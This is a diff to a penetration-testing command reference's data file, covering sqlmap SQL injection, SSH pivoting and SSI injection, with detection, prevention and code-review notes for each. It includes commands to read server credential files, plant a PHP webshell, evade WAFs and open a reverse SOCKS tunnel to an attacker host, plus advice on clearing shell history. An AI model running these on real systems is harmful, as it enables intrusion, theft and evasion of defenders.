       "description": "Reads a file off the database server's filesystem through the injection. Requires DBA privileges and the DBMS FILE permission. SQLMap saves the retrieved file locally under its output/files directory.",
       "platform": "linux",
       "requires": [
@@ -68359,14 +71993,15 @@ const COMMAND_DATA = {
         "impact": "Arbitrary server file read — /etc/passwd (user enumeration), /etc/shadow (password hashes if readable), web application source code (reveals DB credentials in config files), SSH private keys, .env files, SSL certificates. Config files typically contain DB passwords, enabling direct DB access without the application.",
         "detection": "[MITRE T1190] DB query log: LOAD_FILE('/etc/passwd') or similar — no application would execute this. Response: file contents in HTTP response body (UNION dump). File system audit: access events on /etc/passwd, web config files by the mysql process.",
         "artifacts": "SQLMap output: ~/.sqlmap/output/target/files/_etc_passwd — local copy of exfiltrated file. DB query log: LOAD_FILE() calls. HTTP response (if logged): file contents in body.",
-        "prevention": "Revoke FILE privilege from app DB user (GRANT SELECT, INSERT ON myapp.* TO 'webapp'@'localhost' — no FILE). Set MySQL secure_file_priv='/var/lib/mysql-files/' — restricts LOAD_FILE to that directory. Parameterized queries prevent the injection prerequisite."
+        "prevention": "Revoke FILE privilege from app DB user (GRANT SELECT, INSERT ON myapp.* TO 'webapp'@'localhost' — no FILE). Set MySQL secure_file_priv='/var/lib/mysql-files/' — restricts LOAD_FILE to that directory. Parameterized queries prevent the injection prerequisite.",
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
       "type": "command"
     },
     {
       "id": "sqlmap-detection-tuning",
       "name": "SQLMap - Response Comparison Tuning",
-      "command": "sqlmap -u \"http://target.com/?id=1\" --string=\"success\" --batch",
+      "command": "sqlmap -u \"http://<target>/?id=1\" --string=\"success\" --batch",
       "description": "Tells SQLMap how to distinguish a TRUE from a FALSE response during blind injection. --string matches text present only on TRUE pages; alternatives are --code=200 (status), --titles (page title), and --text-only (ignore markup). Improves accuracy when pages differ subtly.",
       "platform": "linux",
       "requires": [
@@ -68450,14 +72085,15 @@ const COMMAND_DATA = {
         "impact": "More reliable injection confirmation on complex or dynamic applications — detection tuning prevents SQLMap from giving up on a genuinely vulnerable parameter or wasting time on a false positive.",
         "detection": "Detection tuning itself leaves the same SQLi signatures. Defenders see: varying boolean payloads (AND 1=1 vs AND 1=2, SLEEP(0) vs SLEEP(5)) with SQLMap analysing response differences.",
         "artifacts": "Access log: pairs of requests with TRUE/FALSE payloads. SQLMap's --string flag artefacts visible in output directory.",
-        "prevention": "Dynamic page content (CSRF tokens, timestamps) makes boolean-blind detection harder — but parameterized queries remain the complete fix regardless of page structure."
+        "prevention": "Dynamic page content (CSRF tokens, timestamps) makes boolean-blind detection harder — but parameterized queries remain the complete fix regardless of page structure.",
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
       "type": "command"
     },
     {
       "id": "sqlmap-technique",
       "name": "SQLMap - Restrict Injection Technique",
-      "command": "sqlmap -u \"http://target.com/?id=1\" --technique=BEU --batch",
+      "command": "sqlmap -u \"http://<target>/?id=1\" --technique=BEU --batch",
       "description": "Limits SQLMap to specific injection techniques. Letters: B boolean-blind, E error-based, U union, S stacked queries, T time-blind, Q inline queries. Restricting the set speeds scans and forces a chosen path, e.g. error-based for --os-shell.",
       "platform": "linux",
       "requires": [
@@ -68533,14 +72169,15 @@ const COMMAND_DATA = {
         "impact": "Technique choice determines detectability: UNION is fast and produces direct output but generates obvious payload signatures. Time-based is slow but nearly invisible — no SQL keywords appear in responses. Error-based requires verbose error output.",
         "detection": "[MITRE T1190] Each technique has distinct signatures: UNION — UNION ALL SELECT in parameters. Time-based — SLEEP(5) or BENCHMARK() patterns, request duration anomalies. Error-based — EXTRACTVALUE/UPDATEXML in parameters + error responses.",
         "artifacts": "Technique-specific artefacts in access/query logs. SQLMap session files record confirmed technique.",
-        "prevention": "Parameterized queries eliminate all techniques. As defence-in-depth: disable DB error display (kills error-based), use a WAF (signature-blocks UNION/SLEEP), set query timeouts on the DB connection (limits time-based effectiveness)."
+        "prevention": "Parameterized queries eliminate all techniques. As defence-in-depth: disable DB error display (kills error-based), use a WAF (signature-blocks UNION/SLEEP), set query timeouts on the DB connection (limits time-based effectiveness).",
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
       "type": "command"
     },
     {
       "id": "sqlmap-request-file",
       "name": "SQLMap - Scan from Request File",
-      "command": "sqlmap -r req.txt --batch",
+      "command": "sqlmap -r <request_file> --batch",
       "description": "Feeds SQLMap a full HTTP request saved from Burp (or curl). This preserves every header, cookie, and the exact body, which is the most reliable way to reproduce an authenticated or complex request. Mark the target spot with a *.",
       "platform": "linux",
       "requires": [
@@ -68629,14 +72266,15 @@ const COMMAND_DATA = {
         "impact": "Authenticated SQL injection exploitation — allows testing endpoints behind login, CSRF-protected forms, or custom API headers that simple -u flags cannot replicate.",
         "detection": "[MITRE T1190] Same SQL payload signatures in HTTP body/headers. Unusual: authenticated session generating high-volume identical requests. Cookie value remains constant while parameter varies (automated tool pattern).",
         "artifacts": "Web access log: repeated requests with same Cookie but varying parameter values. Request file saved locally (req.txt) as attacker artefact.",
-        "prevention": "Parameterized queries apply regardless of request complexity. Server-side session rate limiting (not client-side, which is bypassable). CSRF tokens alone do NOT prevent SQLi — they only prevent cross-site request forgery."
+        "prevention": "Parameterized queries apply regardless of request complexity. Server-side session rate limiting (not client-side, which is bypassable). CSRF tokens alone do NOT prevent SQLi — they only prevent cross-site request forgery.",
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
       "type": "command"
     },
     {
       "id": "sqlmap-search",
       "name": "SQLMap - Search Tables/Columns",
-      "command": "sqlmap -u \"http://target.com/?id=1\" --search -C pass --batch",
+      "command": "sqlmap -u \"http://<target>/?id=1\" --search -C pass --batch",
       "description": "Searches the whole database for tables or columns matching a keyword. --search -C pass finds every column containing 'pass'; --search -T user finds tables named like 'user'. Quickly locates credential stores without dumping everything.",
       "platform": "linux",
       "requires": [
@@ -68713,14 +72351,15 @@ const COMMAND_DATA = {
         "impact": "Targeted credential and sensitive-data discovery — attacker finds the exact table.column containing passwords or PII across all databases on the server with keyword search, bypassing the need for full schema enumeration.",
         "detection": "[MITRE T1190] DB query log: INFORMATION_SCHEMA searches with LIKE '%user%' or '%pass%' — clearly automated reconnaissance, not application-generated queries.",
         "artifacts": "SQLMap search results in output directory. DB query log: LIKE-based INFORMATION_SCHEMA column/table searches.",
-        "prevention": "Parameterized queries eliminate the SQLi prerequisite. Sensitive column naming conventions (obfuscating 'password' as 'user_credential_hash') provide minimal obscurity benefit — not a real control."
+        "prevention": "Parameterized queries eliminate the SQLi prerequisite. Sensitive column naming conventions (obfuscating 'password' as 'user_credential_hash') provide minimal obscurity benefit — not a real control.",
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
       "type": "command"
     },
     {
       "id": "sqlmap-tamper",
       "name": "SQLMap - Tamper Scripts",
-      "command": "sqlmap -u \"http://target.com/?id=1\" --tamper=between,randomcase --batch",
+      "command": "sqlmap -u \"http://<target>/?id=1\" --tamper=between,randomcase --batch",
       "description": "Applies tamper scripts that rewrite payloads to evade WAFs and filters - for example replacing spaces, changing case, or swapping operators. Chain several with commas. List all available scripts with --list-tampers.",
       "platform": "linux",
       "requires": [
@@ -68801,14 +72440,15 @@ const COMMAND_DATA = {
         "impact": "Bypass of signature-based WAFs and IDS rules. A correctly chosen tamper combination makes SQLMap payloads invisible to keyword-matching defences while remaining functionally identical to the DB engine. ModSecurity, IDS, and network sensors are defeated by obfuscation.",
         "detection": "[MITRE T1190] Semantic normalisation: decode URL encoding, normalise case, expand /**/ to spaces, then match SQL grammar — finds tampered payloads that signature matching misses. DB query log always shows the final decoded SQL regardless of payload encoding. ML WAF: high request rate to one parameter with varying payload structure.",
         "artifacts": "Access log: obfuscated parameter values (/**/between spaces, mIxEdCaSe keywords). WAF log: requests that passed WAF inspection but DB log shows SQL injection attempt.",
-        "prevention": "WAF as defense-in-depth only — not a primary SQLi control. Semantic/normalizing WAF (decode before match) catches most tampers. Parameterized queries make tamper scripts irrelevant — the payload never reaches the SQL parser as code."
+        "prevention": "WAF as defense-in-depth only — not a primary SQLi control. Semantic/normalizing WAF (decode before match) catches most tampers. Parameterized queries make tamper scripts irrelevant — the payload never reaches the SQL parser as code.",
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
       "type": "command"
     },
     {
       "id": "sqlmap-post-data",
       "name": "SQLMap - Test POST Data",
-      "command": "sqlmap -u \"http://target.com/\" --data=\"uid=1&name=test\"",
+      "command": "sqlmap -u \"http://<target>/\" --data=\"uid=1&name=test\"",
       "description": "Tests POST body parameters instead of the URL query string. SQLMap injects into each parameter in --data. Add a * after a value to force injection at exactly that spot.",
       "platform": "linux",
       "requires": [
@@ -68837,7 +72477,7 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "JSON POST body (APIs / modern apps)",
-          "command": "sqlmap -u \"http://target.com/api/action\" -X POST -H \"Content-Type: application/json\" --data-raw '{\"id\":1}' --batch"
+          "command": "sqlmap -u \"http://<target>/api/action\" -X POST -H \"Content-Type: application/json\" --data-raw '{\"id\":1}' --batch"
         }
       ],
       "examples": [
@@ -68897,14 +72537,15 @@ const COMMAND_DATA = {
         "impact": "Full SQL injection exploitation through POST parameters — login forms, search boxes, API endpoints. POST parameters are not logged in standard web server access logs, making exploitation harder to detect retroactively.",
         "detection": "[MITRE T1190] WAF/IDS: POST body content matching SQL patterns (UNION, SLEEP, BENCHMARK, INFORMATION_SCHEMA). Request body size anomalies — normal POST forms have bounded, predictable content. Rate-based: burst of identical POST requests with varying body content. Application log: repeated authentication failures from the same IP (if testing login forms).",
         "artifacts": "Application log: many POST requests to the same endpoint. WAF log: POST body payload matches. SQLMap output directory: confirmed injection results for the POST parameter.",
-        "prevention": "Same as GET: parameterized queries, WAF with POST-body inspection, rate limiting on all form endpoints."
+        "prevention": "Same as GET: parameterized queries, WAF with POST-body inspection, rate limiting on all form endpoints.",
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
       "type": "command"
     },
     {
       "id": "sqlmap-union-tuning",
       "name": "SQLMap - UNION Query Tuning",
-      "command": "sqlmap -u \"http://target.com/?id=1\" --union-cols=5 --union-char=1 --batch",
+      "command": "sqlmap -u \"http://<target>/?id=1\" --union-cols=5 --union-char=1 --batch",
       "description": "Manually configures UNION-based extraction. --union-cols sets the exact column count, --union-char sets the value used to fill columns (some apps reject NULL), and --union-from names the table to append in the FROM clause. Use when SQLMap cannot auto-detect the column count.",
       "platform": "linux",
       "requires": [
@@ -68980,14 +72621,15 @@ const COMMAND_DATA = {
         "impact": "UNION injection on queries that SQLMap's automatic detection fails — unusual column counts, string-only columns, DB-specific syntax requirements. Without tuning, these endpoints appear non-injectable; with tuning they are fully exploitable.",
         "detection": "[MITRE T1190] UNION ALL SELECT with varying column counts in parameters. ORDER BY N increment pattern in preceding requests (column count detection). Requests with custom fill characters like 'a','a','a' in UNION columns.",
         "artifacts": "Access log: ORDER BY 1, ORDER BY 2... sequence followed by UNION SELECT payloads. Confirmed column count stored in SQLMap session.",
-        "prevention": "Parameterized queries prevent UNION injection. UNION-based attacks require visible output — applications that always return fixed-format responses regardless of query results are naturally resistant (but still vulnerable to other techniques)."
+        "prevention": "Parameterized queries prevent UNION injection. UNION-based attacks require visible output — applications that always return fixed-format responses regardless of query results are naturally resistant (but still vulnerable to other techniques).",
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
       "type": "command"
     },
     {
       "id": "sqlmap-waf-bypass",
       "name": "SQLMap - WAF Evasion Options",
-      "command": "sqlmap -u \"http://target.com/?id=1\" --random-agent --skip-waf --chunked --batch",
+      "command": "sqlmap -u \"http://<target>/?id=1\" --random-agent --skip-waf --chunked --batch",
       "description": "Bundles common WAF-evasion switches. --random-agent avoids the blacklisted default SQLMap User-Agent, --skip-waf skips the WAF-detection probe, and --chunked splits the request body using chunked transfer encoding to slip past keyword filters.",
       "platform": "linux",
       "requires": [
@@ -69071,16 +72713,17 @@ const COMMAND_DATA = {
         "impact": "Successful exploitation of endpoints protected by WAF/IDS — attackers routinely combine 3-4 tamper scripts to bypass signature-based WAFs. The combination of tampers + random-agent + proxy/Tor makes automated SQLi traffic nearly indistinguishable from normal browsing.",
         "detection": "[MITRE T1190] Even with bypass: semantic analysis of decoded/normalised request values reveals SQL intent. ML-based WAFs detect behavioral patterns (parameter mutation rate, request timing) rather than signatures. Anomaly: parameter value transforms (/**/ instead of space) are unusual for legitimate users. DB query log still shows injected SQL regardless of how it arrived.",
         "artifacts": "Access log: requests with /**/comment syntax, mixed-case SQL keywords, chunked encoding. WAF log: bypass attempts that succeeded (no block but payload matched relaxed rule).",
-        "prevention": "WAF signature rules alone are insufficient — tamper scripts bypass them. True fix: parameterized queries + semantic/behavioral WAF (Cloudflare, AWS WAF, ModSecurity with anomaly scoring > keyword matching). Never rely solely on WAF for SQLi protection."
+        "prevention": "WAF signature rules alone are insufficient — tamper scripts bypass them. True fix: parameterized queries + semantic/behavioral WAF (Cloudflare, AWS WAF, ModSecurity with anomaly scoring > keyword matching). Never rely solely on WAF for SQLi protection.",
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
       "variations": [
         {
           "label": "Smartphone UA spoof (bypass mobile-vs-desktop filters)",
-          "command": "sqlmap -u \"http://target.com/?id=1\" --mobile --batch"
+          "command": "sqlmap -u \"http://<target>/?id=1\" --mobile --batch"
         },
         {
           "label": "Copy browser headers to bypass header-based auth / WAF checks",
-          "command": "sqlmap -u \"http://target.com/?id=1\" -H 'Accept: text/html,*/*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Connection: keep-alive' -H 'DNT: 1' --random-agent --batch"
+          "command": "sqlmap -u \"http://<target>/?id=1\" -H 'Accept: text/html,*/*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Connection: keep-alive' -H 'DNT: 1' --random-agent --batch"
         }
       ],
       "type": "command"
@@ -69088,7 +72731,7 @@ const COMMAND_DATA = {
     {
       "id": "sqlmap-file-write",
       "name": "SQLMap - Write File / Webshell",
-      "command": "sqlmap -u \"http://target.com/?id=1\" --file-write \"shell.php\" --file-dest \"/var/www/html/shell.php\"",
+      "command": "sqlmap -u \"http://<target>/?id=1\" --file-write \"shell.php\" --file-dest \"/var/www/html/shell.php\"",
       "description": "Uploads a local file to the server via SQL injection. Writing a PHP webshell into the webroot turns SQLi into remote command execution - request it afterward with ?cmd=. Requires DBA and FILE privileges and a writable webroot.",
       "platform": "linux",
       "requires": [
@@ -69165,7 +72808,8 @@ const COMMAND_DATA = {
         "impact": "Remote code execution via webshell — attacker gains OS command execution as the web server user (www-data). Full shell access, file system read/write, network pivoting, persistence. Combined with a SUID binary or sudo misconfiguration, this escalates to root.",
         "detection": "[MITRE T1190, T1505.003] File system: new .php file appearing in web root not corresponding to any deployment. Web access log: requests to an unknown PHP file (tmpXXXXX.php). DB query log: INTO OUTFILE with path in web root. File integrity monitoring (FIM): unexpected new file in web directories.",
         "artifacts": "Web root: shell.php or tmpXXXXX.php webshell file. Web access log: curl requests to shell.php?cmd=. DB query log: INTO OUTFILE queries. SQLMap stager files: tmpumgzr.php, tmpbznbe.php.",
-        "prevention": "Revoke FILE privilege. Set secure_file_priv to a non-web-accessible path. Web root directory: web server user should not have write permission (deploy via CI/CD pipeline, not directly writable). File integrity monitoring on web directories. Parameterized queries eliminate the prerequisite."
+        "prevention": "Revoke FILE privilege. Set secure_file_priv to a non-web-accessible path. Web root directory: web server user should not have write permission (deploy via CI/CD pipeline, not directly writable). File integrity monitoring on web directories. Parameterized queries eliminate the prerequisite.",
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
       "type": "command"
     },
@@ -69370,7 +73014,13 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Network design: flat Layer-3 network, all VLANs can reach each other\n# DMZ web server can ping/connect to: 10.10.10.0/24 (internal LAN), 10.10.20.0/24 (DB subnet)\n# No egress proxy — direct outbound HTTP to any IP allowed\n\n# iptables on pivot host (none blocking outbound):\niptables -L OUTPUT  # policy ACCEPT, no rules\n\n# This allows: chisel client 10.10.10.5:8080 R:socks\n# Attacker now has SOCKS5 access to the entire internal network",
         "secure_config": "# Network segmentation with explicit allow rules:\n# DMZ -> Internet: only specific egress IPs (patch servers, DNS)\n# DMZ -> Internal: ONLY the DB ports this specific app needs\n# Internal -> Internal: segment by tier (web tier can't reach DC directly)\n\n# Egress filtering — block all outbound except known-good:\n# FortiGate / Palo Alto / iptables:\niptables -P OUTPUT DROP\niptables -A OUTPUT -d 8.8.8.8 -p udp --dport 53 -j ACCEPT  # DNS to specific server\niptables -A OUTPUT -p tcp --dport 443 -d <known_update_servers> -j ACCEPT\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n\n# IDS/IPS signatures for Chisel, ngrok, frp traffic patterns\n# DNS monitoring — detect DNS tunneling (dnscat2) via unusual query frequency/length\n# HTTP proxy with TLS inspection — detect reverse tunnels in HTTPS streams"
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Background + no shell",
+          "command": "ssh -f -N -D <socks_port> <user>@<pivot>"
+        }
+      ]
     },
     {
       "type": "command",
@@ -69472,7 +73122,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Services expose excessive information: version banners, supported auth methods, valid usernames via error responses. IPMI has no authentication (version 2.0 cipher 0 vulnerability). RSH/rexec trust .rhosts files. rsync shares readable anonymously. Oracle TNS allows remote poisoning in older versions.",
         "vulnerable_config": "# IPMI cipher 0 — no authentication required:\n# ipmitool -H <ip> -U admin -P '' -I lanplus -C 0 chassis status\n# Returns valid data — auth bypassed entirely\n\n# rsync anonymous access:\n# rsync --list-only rsync://<ip>/  # lists all modules without auth\n# rsync rsync://<ip>/backup /tmp   # downloads backup files\n\n# Oracle TNS — version banner reveals exact version:\n# nmap -p 1521 -sV -> Oracle Database 11.2.0.4 (exact version)",
-        "secure_config": "# IPMI — disable cipher 0, enable only strong ciphers:\n# /etc/ipmi/ipmievd.conf: IPMI_CIPHER_SUITE=17  (AES, mandatory auth)\n# Or disable IPMI entirely if not needed (BMC IPMI = critical attack surface)\n\n# rsync — require auth:\n# /etc/rsyncd.conf:\n# [backup]\n#   auth users = backupuser\n#   secrets file = /etc/rsyncd.secrets\n#   hosts allow = 10.10.1.0/24\n\n# RSH/rexec — disable entirely (replaced by SSH):\nsystemctl disable rsh.socket rexec.socket rlogin.socket\n\n# Oracle TNS — disable remote admin, enforce auth:\n# sqlnet.ora: SQLNET.AUTHENTICATION_SERVICES = (BEQ, TCPS)  (not NONE)"
+        "secure_config": "# IPMI — disable cipher 0, enable only strong ciphers:\n# /etc/ipmi/ipmievd.conf: IPMI_CIPHER_SUITE=17  (AES, mandatory auth)\n# Or disable IPMI entirely if not needed (BMC IPMI = critical attack surface)\n\n# rsync — require auth:\n# /etc/rsyncd.conf:\n# [backup]\n#   auth users = backupuser\n#   secrets file = /etc/rsyncd.secrets\n#   hosts allow = 10.10.1.0/24\n\n# RSH/rexec — disable entirely (replaced by SSH):\nsystemctl disable rsh.socket rexec.socket rlogin.socket\n\n# Oracle TNS — disable remote admin, enforce auth:\n# sqlnet.ora: SQLNET.AUTHENTICATION_SERVICES = (BEQ, TCPS)  (not NONE)",
+        "evasion": "Use key/valid-cred auth so it blends with admin activity; avoid writing tools to disk — pipe commands over the session; clean shell history."
       }
     },
     {
@@ -69652,7 +73303,13 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Network design: flat Layer-3 network, all VLANs can reach each other\n# DMZ web server can ping/connect to: 10.10.10.0/24 (internal LAN), 10.10.20.0/24 (DB subnet)\n# No egress proxy — direct outbound HTTP to any IP allowed\n\n# iptables on pivot host (none blocking outbound):\niptables -L OUTPUT  # policy ACCEPT, no rules\n\n# This allows: chisel client 10.10.10.5:8080 R:socks\n# Attacker now has SOCKS5 access to the entire internal network",
         "secure_config": "# Network segmentation with explicit allow rules:\n# DMZ -> Internet: only specific egress IPs (patch servers, DNS)\n# DMZ -> Internal: ONLY the DB ports this specific app needs\n# Internal -> Internal: segment by tier (web tier can't reach DC directly)\n\n# Egress filtering — block all outbound except known-good:\n# FortiGate / Palo Alto / iptables:\niptables -P OUTPUT DROP\niptables -A OUTPUT -d 8.8.8.8 -p udp --dport 53 -j ACCEPT  # DNS to specific server\niptables -A OUTPUT -p tcp --dport 443 -d <known_update_servers> -j ACCEPT\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n\n# IDS/IPS signatures for Chisel, ngrok, frp traffic patterns\n# DNS monitoring — detect DNS tunneling (dnscat2) via unusual query frequency/length\n# HTTP proxy with TLS inspection — detect reverse tunnels in HTTPS streams"
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Reverse SOCKS (-R dynamic)",
+          "command": "ssh -R <socks_port> <user>@<attacker>"
+        }
+      ]
     },
     {
       "id": "sshuttle",
@@ -69740,7 +73397,13 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Network design: flat Layer-3 network, all VLANs can reach each other\n# DMZ web server can ping/connect to: 10.10.10.0/24 (internal LAN), 10.10.20.0/24 (DB subnet)\n# No egress proxy — direct outbound HTTP to any IP allowed\n\n# iptables on pivot host (none blocking outbound):\niptables -L OUTPUT  # policy ACCEPT, no rules\n\n# This allows: chisel client 10.10.10.5:8080 R:socks\n# Attacker now has SOCKS5 access to the entire internal network",
         "secure_config": "# Network segmentation with explicit allow rules:\n# DMZ -> Internet: only specific egress IPs (patch servers, DNS)\n# DMZ -> Internal: ONLY the DB ports this specific app needs\n# Internal -> Internal: segment by tier (web tier can't reach DC directly)\n\n# Egress filtering — block all outbound except known-good:\n# FortiGate / Palo Alto / iptables:\niptables -P OUTPUT DROP\niptables -A OUTPUT -d 8.8.8.8 -p udp --dport 53 -j ACCEPT  # DNS to specific server\niptables -A OUTPUT -p tcp --dport 443 -d <known_update_servers> -j ACCEPT\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n\n# IDS/IPS signatures for Chisel, ngrok, frp traffic patterns\n# DNS monitoring — detect DNS tunneling (dnscat2) via unusual query frequency/length\n# HTTP proxy with TLS inspection — detect reverse tunnels in HTTPS streams"
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Exclude your own subnet",
+          "command": "sudo sshuttle -r <user>@<pivot> <target_subnet> -x <your_subnet>"
+        }
+      ]
     },
     {
       "id": "ssi-injection",
@@ -69838,7 +73501,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "The web server (Apache, nginx) has Server Side Includes (SSI) enabled for a directory that serves user-controlled content (uploaded files, user-generated HTML pages). SSI directives like <!--#exec cmd=\"...\" --> are processed at the server level before being sent to the client. If an attacker can upload or inject content into an SSI-processed page, they achieve OS command execution.",
         "vulnerable_config": "# Apache httpd.conf — SSI enabled for document root (vulnerable):\n<Directory /var/www/html>\n    Options +Includes          # enables SSI parsing\n    AddType text/html .shtml  # .shtml files are SSI-parsed\n    AddOutputFilter INCLUDES .shtml\n</Directory>\n\n# Even more dangerous — if .html extension is also SSI-parsed:\nAddOutputFilter INCLUDES .html  # any .html file with <!--#exec--> runs OS commands\n\n# File upload vulnerability that enables SSI:\n# App allows upload of .shtml files to a directory with SSI enabled\n# Payload in uploaded file: <!--#exec cmd=\"id\" -->",
-        "secure_config": "# Apache — disable SSI globally (most servers don't need it):\n<Directory /var/www/html>\n    Options -Includes          # explicitly disable\n</Directory>\n\n# If SSI is required for legacy features:\n# 1. Restrict to a specific non-user-writeable directory:\n<Directory /var/www/trusted-only>\n    Options +Includes\n</Directory>\n\n# 2. Disable the 'exec' SSI command (keep document includes but block RCE):\n<Directory /var/www/html>\n    Options +Includes\n    SSILegacyExprParser off\n</Directory>\n# In Apache 2.4+, use: SSIExec off\n\n# 3. File upload validation:\n# Allowlist extensions — never allow .shtml, .shtm, .stm\n# Store uploads outside the web root (serve via X-Accel-Redirect or similar)"
+        "secure_config": "# Apache — disable SSI globally (most servers don't need it):\n<Directory /var/www/html>\n    Options -Includes          # explicitly disable\n</Directory>\n\n# If SSI is required for legacy features:\n# 1. Restrict to a specific non-user-writeable directory:\n<Directory /var/www/trusted-only>\n    Options +Includes\n</Directory>\n\n# 2. Disable the 'exec' SSI command (keep document includes but block RCE):\n<Directory /var/www/html>\n    Options +Includes\n    SSILegacyExprParser off\n</Directory>\n# In Apache 2.4+, use: SSIExec off\n\n# 3. File upload validation:\n# Allowlist extensions — never allow .shtml, .shtm, .stm\n# Store uploads outside the web root (serve via X-Accel-Redirect or similar)",
+        "code_review": "RED FLAGS (source/config): SSI enabled on user-reflected pages.\n  Apache: Options +Includes  |  user input reflected into .shtml  |  <!--#exec cmd=...-->\nGREP:  grep -rniE \"Options.*Includes|AddHandler.*shtml|#exec|#include\" .\nSAFE:  Options -Includes (or IncludesNOEXEC), never render user input into SSI-parsed pages."
       }
     },
     {
@@ -70026,11 +73690,6 @@ const COMMAND_DATA = {
       },
       "variations": [
         {
-          "description": "Basic SSL/TLS scan (show ciphers, protocol versions, cert info)",
-          "command": "sslscan <host>",
-          "label": "sslscan"
-        },
-        {
           "description": "Scan specific port",
           "command": "sslscan <host>:<port>",
           "label": "sslscan"
@@ -70137,7 +73796,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "The application accepts user-controlled URLs or hostnames and makes server-side HTTP requests without validating the destination. Common patterns: image preview from a URL, webhook configuration, PDF generator, document parser (XML with XXE), or any 'fetch this URL' feature. The server's outbound requests can reach internal services (metadata APIs, Redis, Elasticsearch, internal admin panels) that are not exposed externally.",
